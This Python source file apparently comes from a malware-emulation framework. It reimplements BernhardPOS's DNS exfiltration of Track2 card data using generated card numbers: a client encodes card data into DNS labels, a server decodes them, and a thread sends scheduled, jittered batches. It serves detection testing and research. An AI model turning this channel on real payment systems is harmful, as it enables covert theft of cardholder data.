import sys
from time import sleep
from typing import Tuple, Optional

from dnslib import DNSRecord, RR, QTYPE, A

from data.creditcard.ccgen import CreditCardGenerator
from malware import base, schedules
from malware.helper import jitter
from util import info, ok
from .encoding import encode_label, decode_label


class Client(base.Client):
    """
    Exfils Track2 card data.

    Sources:
        https://securitykitten.github.io/2015/07/14/bernhardpos.html
    """

    def __init__(self, domain: str):
        self.domain = domain or "bpos.lan"
        self.data = None

    def send(self, cc_data: str):
        """
        Example (https://securitykitten.github.io/2015/07/14/bernhardpos.html):
        encoded: PzMnPiosOD4nOCwuOzomPS4nNjovPS8uOzsnNCstODkjOCwoMwAA.domain.tld
        decoded [490303340561001048=080510109123345678] .domain.tld
        """
        return f"{encode_label(cc_data)}.{self.domain}"

    def __str__(self):
        return '%s(%s)' % (type(self).__name__, ', '.join('%s=%s' % item for item in vars(self).items()))


class Server(base.Server):
    def receive(self, record: DNSRecord) -> DNSRecord:
        """
        Example (https://securitykitten.github.io/2015/07/14/bernhardpos.html):
        encoded: PzMnPiosOD4nOCwuOzomPS4nNjovPS8uOzsnNCstODkjOCwoMwAA.domain.tld
        decoded [490303340561001048=080510109123345678] .domain.tld
        """

        question = record.get_q()

        # Get payload from query
        payload = self.get_payload(question)
        if payload is not False:
            self.process(payload)

            # Respond
            reply = record.reply()
            reply.add_answer(RR(question.get_qname(), QTYPE.A, rdata=A(self.server_ip), ttl=3600))
            return reply

        else:
            info(f"[BernhardPOS] Server: Ignoring query for other domain: {question.qname}")

    def process_payload(self, payload: str) -> Optional[str]:
        return decode_label(payload)


class Exfiltration(base.ExfiltrationThread):
    """
    Thread used to exfiltrate the provided information:
    Supported:
        - Credit card data
    """

    def __init__(self, client: Client, dns_settings: Tuple[str, int], log_dir: str, schedule: schedules.TypeA,
                 data_source: CreditCardGenerator = None):

        super().__init__(client, dns_settings, log_dir)
        self.schedule = schedule
        self.unlimited_credit_cards = data_source or CreditCardGenerator(track_type=2)

    def run(self):
        """
        Exfiltrates a list of track2 credit card data according to the schedule mentioned in the securitykitten blog.
        Every three minutes, the "memory is scraped" (i.e., we provide some details) and exfiltrated.
        We provide rand(0,5) entries at a time and exfil one per query.

        N.B.: Blocking function!! Run this in a separate thread somewhere else.
        """
        info("[BernhardPOS] Started exfil thread.")

        while True:

            # Determine size of current batch
            n_cards = self.schedule.lookup()

            if n_cards > 0:
                self.analytics(n_cards)
                info(self.print_debug("BernhardPOS", n_cards))

                for _ in range(n_cards):
                    card, _ = next(self.unlimited_credit_cards) or (ok("Exfil complete!") and sys.exit(0))

                    # BernhardPOS ignores control characters (; and trailing ?3)
                    query = self.client.send(card[1:-2])

                    # Create DNSRecord and send!
                    self.dns_query(query, 'A')

            # Sleep for SLEEP + some jitter seconds
            sleep(jitter(self.schedule.get_interval(), jitter_range=.05))


def smoke_test():
    client = Client(domain="lan")
    data = ";2226789592775813=082696402650581?"
    query = client.send(data)

    server = Server(domain="bpos.lan")
    data_recv = server.receive("PzogOiotPzsjPi4rODgvPCcvOTgjPC0uOzsiOysnMz4uPS4pAAAA.bpos.lan")


if __name__ == "__main__":
    smoke_test()
